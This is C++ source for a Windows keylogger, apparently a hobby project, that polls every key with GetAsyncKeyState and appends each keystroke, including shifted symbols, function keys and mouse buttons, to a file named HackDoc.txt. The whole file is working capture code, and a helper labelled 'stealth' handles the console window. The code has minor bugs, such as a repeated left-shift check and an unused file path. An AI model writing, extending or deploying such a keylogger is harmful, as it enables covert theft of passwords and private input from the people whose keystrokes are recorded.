#include "basic_func.h"

/*******************************************************************/

/* Date: 10.06.2018                                                */

/* Developer: Artem Gord1728                                       */

/* Copyright: 2018 Artem Gord1728. All rights reserved.            */

/* Description: Code with basic functionality                      */

/*******************************************************************/




void K_Logger::WriteToFile(LPCSTR text)
{
	std::ofstream doc_to;
	doc_to.open("HackDoc.txt", std::fstream::app);
	doc_to << text;
	doc_to.close();
}

int K_Logger::SaveSymbol(WORD iKey)
{
	switch (iKey)
	{
		case 48:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << ")";
				WriteToFile(")");
			}
			else
			{
				std::cout << "0";
				WriteToFile("0");
			}
			break;

		case 49:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_LSHIFT))
			{
				std::cout << "!";
				WriteToFile("!");
			}
			else
			{
				std::cout << "1";
				WriteToFile("1");
			}
			break;

		case 50:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "@";
				WriteToFile("@");
			}
			else
			{
				std::cout << "2";
				WriteToFile("2");
			}
			break;

		case 51:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "#";
				WriteToFile("#");
			}
			else
			{
				std::cout << "3";
				WriteToFile("3");
			}
			break;

		case 52:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "$";
				WriteToFile("$");
			}
			else
			{
				std::cout << "4";
				WriteToFile("4");
			}
			break;

		case 53:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "%";
				WriteToFile("%");
			}
			else
			{
				std::cout << "5";
				WriteToFile("5");
			}
			break;

		case 54:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "^";
				WriteToFile("^");
			}
			else
			{
				std::cout << "6";
				WriteToFile("6");
			}
			break;

		case 55:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "&";
				WriteToFile("&");
			}
			else
			{
				std::cout << "7";
				WriteToFile("7");
			}
			break;

		case 56:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "*";
				WriteToFile("*");
			}
			else
			{
				std::cout << "8";
				WriteToFile("8");
			}
			break;

		case 57:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "(";
				WriteToFile("(");
			}
			else
			{
				std::cout << "9";
				WriteToFile("9");
			}
			break;

		case 65:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "À";
				WriteToFile("À");
			}
			else
			{
				std::cout << "a";
				WriteToFile("a");
			}
			break;

		case 66:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "B";
				WriteToFile("B");
			}
			else
			{
				std::cout << "b";
				WriteToFile("b");
			}
			break;

		case 67:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "C";
				WriteToFile("C");
			}
			else
			{
				std::cout << "c";
				WriteToFile("c");
			}
			break;

		case 68:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "D";
				WriteToFile("D");
			}
			else
			{
				std::cout << "d";
				WriteToFile("d");
			}
			break;

		case 69:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "E";
				WriteToFile("E");
			}
			else
			{
				std::cout << "e";
				WriteToFile("e");
			}
			break;

		case 70:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "F";
				WriteToFile("F");
			}
			else
			{
				std::cout << "f";
				WriteToFile("f");
			}
			break;

		case 71:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "G";
				WriteToFile("G");
			}
			else
			{
				std::cout << "g";
				WriteToFile("g");
			}
			break;

		case 72:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "H";
				WriteToFile("H");
			}
			else
			{
				std::cout << "h";
				WriteToFile("h");
			}
			break;

		case 73:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "I";
				WriteToFile("I");
			}
			else
			{
				std::cout << "i";
				WriteToFile("i");
			}
			break;

		case 74:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "J";
				WriteToFile("J");
			}
			else
			{
				std::cout << "j";
				WriteToFile("j");
			}
			break;


		case 75:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "K";
				WriteToFile("K");
			}
			else
			{
				std::cout << "k";
				WriteToFile("k");
			}
			break;


		case 76:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "L";
				WriteToFile("L");
			}
			else
			{
				std::cout << "l";
				WriteToFile("l");
			}
			break;

		case 77:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "M";
				WriteToFile("M");
			}
			else
			{
				std::cout << "m";
				WriteToFile("m");
			}
			break;


		case 78:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "N";
				WriteToFile("N");
			}
			else
			{
				std::cout << "n";
				WriteToFile("n");
			}
			break;

		case 79:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "O";
				WriteToFile("O");
			}
			else
			{
				std::cout << "o";
				WriteToFile("o");
			}
			break;

		case 80:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "P";
				WriteToFile("P");
			}
			else
			{
				std::cout << "p";
				WriteToFile("p");
			}
			break;

		case 81:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "Q";
				WriteToFile("Q");
			}
			else
			{
				std::cout << "q";
				WriteToFile("q");
			}
			break;

		case 82:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "R";
				WriteToFile("R");
			}
			else
			{
				std::cout << "r";
				WriteToFile("r");
			}
			break;

		case 83:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "S";
				WriteToFile("S");
			}
			else
			{
				std::cout << "s";
				WriteToFile("s");
			}
			break;

		case 84:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "T";
				WriteToFile("T");
			}
			else
			{
				std::cout << "t";
				WriteToFile("t");
			}
			break;

		case 85:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "U";
				WriteToFile("U");
			}
			else
			{
				std::cout << "u";
				WriteToFile("u");
			}
			break;

		case 86:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "V";
				WriteToFile("V");
			}
			else
			{
				std::cout << "v";
				WriteToFile("v");
			}
			break;

		case 87:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "W";
				WriteToFile("W");
			}
			else
			{
				std::cout << "w";
				WriteToFile("w");
			}
			break;

		case 88:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "X";
				WriteToFile("X");
			}
			else
			{
				std::cout << "x";
				WriteToFile("x");
			}
			break;

		case 89:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "Y";
				WriteToFile("Y");
			}
			else
			{
				std::cout << "y";
				WriteToFile("y");
			}
			break;

		case 90:
			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			{
				std::cout << "Z";
				WriteToFile("Z");
			}
			else
			{
				std::cout << "z";
				WriteToFile("z");
			}
			break;




		case VK_F1:
			std::cout << "  *F1*  ";
			WriteToFile("  *F1*  ");
			break;

		case VK_F2:
			std::cout << "  *F2*  ";
			WriteToFile("  *F2*  ");
			break;

		case VK_F3:
			std::cout << "  *F3*  ";
			WriteToFile("  *F3*  ");
			break;

		case VK_F4:
			std::cout << "  *F4*  ";
			WriteToFile("  *F4*  ");
			break;

		case VK_F5:
			std::cout << "  *F5*  ";
			WriteToFile("  *F5*  ");
			break;

		case VK_F6:
			std::cout << "  *F6*  ";
			WriteToFile("  *F6*  ");
			break;

		case VK_F7:
			std::cout << "  *F7*  ";
			WriteToFile("  *F7*  ");
			break;

		case VK_F8:
			std::cout << "  *F8*  ";
			WriteToFile("  *F8*  ");
			break;

		case VK_F9:
			std::cout << "  *F9*  ";
			WriteToFile("  *F9*  ");
			break;

		case VK_F10:
			std::cout << "  *F10*  ";
			WriteToFile("  *F10*  ");
			break;

		case VK_F11:
			std::cout << "  *F11*  ";
			WriteToFile("  *F11*  ");
			break;

		case VK_F12:
			std::cout << "  *F12*  ";
			WriteToFile("  *F12*  ");
			break;

		case VK_END:
			std::cout << "  *END*  ";
			WriteToFile("  *END*  ");
			break;

		case VK_HOME:
			std::cout << "  *HOME*  ";
			WriteToFile("  *HOME*  ");
			break;

		case VK_NUMLOCK:
			std::cout << "  *Num_Lock*  ";
			WriteToFile("  *Num_Lock*  ");
			break;

		case VK_RWIN:
			std::cout << "  *Right_Windows*  ";
			WriteToFile("  *Right_Windows*  ");
			break;





		//+-+-+-+-+-+All figures below are NUMPAD-+-+-+-+-+
		//+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
		case VK_NUMPAD0:
			std::cout << "0";
			WriteToFile("0");
			break;

		case VK_NUMPAD1:
			std::cout << "1";
			WriteToFile("1");
			break;

		case VK_NUMPAD2:
			std::cout << "2";
			WriteToFile("2");
			break;

		case VK_NUMPAD3:
			std::cout << "3";
			WriteToFile("3");
			break;

		case VK_NUMPAD4:
			std::cout << "4";
			WriteToFile("4");
			break;

		case VK_NUMPAD5:
			std::cout << "5";
			WriteToFile("5");
			break;

		case VK_NUMPAD6:
			std::cout << "6";
			WriteToFile("6");
			break;

		case VK_NUMPAD7:
			std::cout << "7";
			WriteToFile("7");
			break;

		case VK_NUMPAD8:
			std::cout << "8";
			WriteToFile("8");
			break;

		case VK_NUMPAD9:
			std::cout << "9";
			WriteToFile("9");
			break;

		case VK_DECIMAL:
			std::cout << ".";
			WriteToFile(".");
			break;

		case VK_SUBTRACT:
			std::cout << "-";
			WriteToFile("-");
			break;

		case VK_MULTIPLY:
			std::cout << "*";
			WriteToFile("*");
			break;

		case VK_DIVIDE:
			std::cout << "/";
			WriteToFile("/");
			break;

		case VK_ADD:
			std::cout << "+";
			WriteToFile("+");
			break;
    	//+-+-+-+-+-+-+-+--+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	   //+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+



		case VK_LWIN:
			std::cout << "Left_Win";
			WriteToFile("Left_Win");
			break;


		case VK_SPACE:
			std::cout << " ";
			WriteToFile(" ");
			break;

		case VK_TAB:
			std::cout << " *TAB* ";
			WriteToFile(" *TAB* ");
			break;

		case VK_MBUTTON:
			std::cout << "  *mouse_middle-button*  ";
			WriteToFile("  *mouse_middle-button*  ");
			break;

		case VK_MENU:
			std::cout << "  *Left_ALT*  ";
			WriteToFile("  *Left_ALT*  ");
			break;

		case VK_SNAPSHOT:
			std::cout << "  *PRINT_SCREEN*  ";
			WriteToFile("  *PRINT_SCREEN*  ");
			break;

		case VK_CAPITAL:
			std::cout << "  *CAPS_LOCK*  ";
			WriteToFile("  *CAPS_LOCK*  ");
			break;

		case VK_RETURN:
			std::cout << "\n";
			WriteToFile("\n");
			break;

		case VK_SHIFT:
			std::cout << " *Left_Shift* ";
			WriteToFile(" *Left_Shift* ");
			break;

		case VK_RSHIFT:
			std::cout << " *Right_Shift* ";
			WriteToFile(" *Right_Shift* ");
			break;

		case VK_BACK:
			std::cout << "\b";
			WriteToFile("\b");
			break;

		case VK_PRIOR:
			std::cout << "  *PageUp*  ";
			WriteToFile("  *PageUp*  ");
			break;

		case VK_NEXT:
			std::cout << "  *PageDown*  ";
			WriteToFile("  *PageDown*  ");
			break;

		case VK_ESCAPE:
			std::cout << " *Esc* ";
			WriteToFile(" *Esc* ");
			break;

		case VK_UP:
			std::cout << " btn_up ";
			WriteToFile(" btn_up ");
			break;

		case VK_DOWN:
			std::cout << " btn_down ";
			WriteToFile(" btn_down ");
			break;

		case VK_LEFT:
			std::cout << " btn_left ";
			WriteToFile(" btn_left ");
			break;

		case VK_RIGHT:
			std::cout << " btn_right ";
			WriteToFile(" btn_right ");
			break;

		case VK_CONTROL:
			std::cout << " btn_ctrl ";
			WriteToFile(" btn_ctrl ");
			break;

		case VK_INSERT:
			std::cout << " Insert ";
			WriteToFile(" Insert ");
			break;

		case VK_DELETE:
			std::cout << " *Delete* ";
			WriteToFile(" Delete ");
			break;


		case VK_RBUTTON:
			std::cout << "*mouse_right*";
			WriteToFile("*mouse_right*");
			break;

		case VK_LBUTTON:
			std::cout << "*mouse_left*";
			WriteToFile("*mouse_left*");
			break;

		default:
			std::cout << "?";
			WriteToFile("?");
			break;
	}
	return 0;
}

void K_Logger::VisibilityApp()
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindow",NULL);
	ShowWindow(stealth, 1);
}


int main()
{
	setlocale(LC_ALL, "ru");

	LPCWSTR fileName = L"D:\\HackFile";


	char key;

	K_Logger kl;

	while (true)
	{
		Sleep(10);
		for (key = 8; key <= 250; key++)
		{
			if (GetAsyncKeyState(key) == -32767)
			{
				kl.SaveSymbol(key);
			}
		}
	}
	system("pause");
	return 0;
}